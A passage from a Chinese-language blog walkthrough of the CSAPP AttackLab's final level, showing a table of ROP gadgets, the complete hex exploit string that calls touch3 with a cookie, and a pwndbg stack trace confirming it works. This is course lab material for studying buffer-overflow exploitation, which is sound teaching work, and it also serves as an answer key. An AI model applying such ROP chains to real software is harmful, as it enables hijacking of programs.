+</span></span><span class=line><span class=cl>  4018c9:	b8 89 d6 20 d2       	mov    $0xd220d689,%eax
+</span></span><span class=line><span class=cl>  4018ce:	c3                   	ret
+</span></span></code></pre></td></tr></table></div></div><p>地址为 0x4018ca。</p><p>在最后计算出 rax 之后，还需要转移到输入参数 rdi 当中，重复使用上面用过的 movq %rax, %rdi。</p><p>整理一下目前为止的 gadget</p><div class=table-wrapper><table><thead><tr><th>地址</th><th>汇编指令</th></tr></thead><tbody><tr><td>0x40191c</td><td>movq %rsp, %rax</td></tr><tr><td>0x40185a</td><td>movq %rax, %rdi</td></tr><tr><td>0x401863</td><td>popq %rax</td></tr><tr><td>0x401921</td><td>movl $eax, %ecx</td></tr><tr><td>0x4018a3</td><td>movl $ecx, %edx</td></tr><tr><td>0x4018ca</td><td>movl $edx, %esi</td></tr><tr><td>0x401887</td><td>lea (%rdi,%rsi,1),%rax</td></tr><tr><td>0x40185a</td><td>movq %rax, %rdi</td></tr></tbody></table></div><p>注意需要计算偏移量。发现相隔有 9 行，也就是 9 * 8 = 72 个字节，十六进制为 0x48。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>00 00 00 00 00 00 00 00
+</span></span><span class=line><span class=cl>1c 19 40 00 00 00 00 00 # 取rsp，调用gadget时，rsp指向下一行
+</span></span><span class=line><span class=cl>5a 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>63 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>48 00 00 00 00 00 00 00 # 这里是设计的偏移量，72 字节，对应 0x48
+</span></span><span class=line><span class=cl>21 19 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>a3 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>ca 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>87 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>5a 18 40 00 00 00 00 00
+</span></span><span class=line><span class=cl>ad 17 40 00 00 00 00 00 # 调用touch3
+</span></span><span class=line><span class=cl>33 64 39 35 34 39 63 61 # 储存的cookie字符串
+</span></span><span class=line><span class=cl>00  # 确保字符串以 \0 结束
+</span></span></code></pre></td></tr></table></div></div><p>使用 pwndbg，可以发现在 getbuf 执行 ret 这一行的时候，栈信息如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00:0000│ rsp 0x7ffffffb3858 —▸ 0x40191c (setval_232+3) ◂— movq %rsp, %rax
+</span></span><span class=line><span class=cl>01:0008│     0x7ffffffb3860 —▸ 0x40185a (setval_422+2) ◂— movq %rax, %rdi
+</span></span><span class=line><span class=cl>02:0010│     0x7ffffffb3868 —▸ 0x401863 (setval_219+4) ◂— popq %rax
+</span></span><span class=line><span class=cl>03:0018│     0x7ffffffb3870 ◂— 0x48 /* &#39;H&#39; */
+</span></span><span class=line><span class=cl>04:0020│     0x7ffffffb3878 —▸ 0x401921 (getval_201+1) ◂— movl %eax, %ecx
+</span></span><span class=line><span class=cl>05:0028│     0x7ffffffb3880 —▸ 0x4018a3 (addval_245+2) ◂— movl %ecx, %edx
+</span></span><span class=line><span class=cl>06:0030│     0x7ffffffb3888 —▸ 0x4018ca (getval_301+1) ◂— movl %edx, %esi
+</span></span><span class=line><span class=cl>07:0038│     0x7ffffffb3890 —▸ 0x401887 (add_xy) ◂— leaq (%rdi, %rsi), %rax
+</span></span><span class=line><span class=cl>08:0040│     0x7ffffffb3898 —▸ 0x40185a (setval_422+2) ◂— movq %rax, %rdi
+</span></span><span class=line><span class=cl>09:0048│     0x7ffffffb38a0 —▸ 0x4017ad (touch3) ◂— pushq %rbx
+</span></span></code></pre></td></tr></table></div></div><p>后续执行也与我们分析的一样，成功完成最后一关！</p><h2 id=参考资料>参考资料</h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>课程概览与 shell. Missing Semester 中文版. <a class=link href=https://missing-semester-cn.github.io/2020/course-shell/ target=_blank rel=noopener>https://missing-semester-cn.github.io/2020/course-shell/</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></section><footer class=article-footer><section class=article-tags><a href=/tags/csapp/>Csapp</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer><script>window.MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]],tags:"ams",processEscapes:!0,packages:{"[+]":["ams"]}},options:{skipHtmlTags:["script","noscript","style","textarea","annotation","annotation-xml"],ignoreHtmlClass:"gist|no-mathjax",processHtmlClass:"main-article"},loader:{load:["[tex]/ams"]}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/csapp_bomblab/><div class=article-image><img src=/p/csapp_bomblab/tree2.eadbf9d1443afa7f5369a14d5b13c06f_hu_ce6062d156fd3c0c.jpeg width=250 height=150 loading=lazy alt="Featured image of post 💣 CSAPP BombLab 实验指南" data-key=csapp_bomblab data-hash="md5-6tv50UQ6+n9TaaFNWxPAbw=="></div><div class=article-details><h2 class=article-title>💣 CSAPP BombLab 实验指南</h2></div></a></article><article><a href=/p/csapp_datalab/><div class=article-details><h2 class=article-title>📊 CSAPP Datalab 实验指南</h2></div></a></article><article class=has-image><a href=/p/guidance3/><div class=article-image><img src=/p/guidance3/guidance3.8352d0a931e8f745b05497ad236f78f9_hu_198ad685bef8d668.png width=250 height=150 loading=lazy alt="Featured image of post 计科大三通关指南" data-key=guidance3 data-hash="md5-g1LQqTHo90WwVJetI294+Q=="></div><div class=article-details><h2 class=article-title>计科大三通关指南</h2></div></a></article><article class=has-image><a href=/p/guidance2/><div class=article-image><img src=/p/guidance2/guidance2.bbcfda78c7c15f870c26b970d8937f35_hu_78921991e07d88ce.jpg width=250 height=150 loading=lazy alt="Featured image of post 计科大二通关指南" data-key=guidance2 data-hash="md5-u8/aeMfBX4cMJrlw2JN/NQ=="></div><div class=article-details><h2 class=article-title>计科大二通关指南</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=ovideros/new_blog data-repo-id=R_kgDOPIzbSQ data-category=Announcements data-category-id=DIC_kwDOPIzbSc4CspIa data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 Ovidero's Blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.31.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.7ca59fa0cd045fc5f03113157395af86259d64de9bfa7f392d01c5f8461997a3.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script src=https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js defer></script><script src=https://cdn.jsdelivr.net/npm/tippy.js@6.3.7/dist/tippy-bundle.umd.min.js defer></script><script>document.addEventListener("DOMContentLoaded",function(){if(typeof tippy=="undefined")return;var e,t=document.querySelectorAll('a.footnote-ref[role="doc-noteref"]');if(!t.length)return;e=new Map,t.forEach(function(t){var s,o,n=t.getAttribute("href");if(!n||n.charAt(0)!=="#")return;if(n=n.slice(1),s=document.getElementById(n),!s)return;e.has(n)||(o=s.cloneNode(!0),o.querySelectorAll(".footnote-backref").forEach(function(e){e.remove()}),e.set(n,o.innerHTML.trim())),tippy(t,{content:e.get(n),allowHTML:!0,interactive:!0,theme:"light-border",maxWidth:360,appendTo:document.body,placement:"auto",touch:["hold",400],animation:"shift-away"})})})</script></body></html>
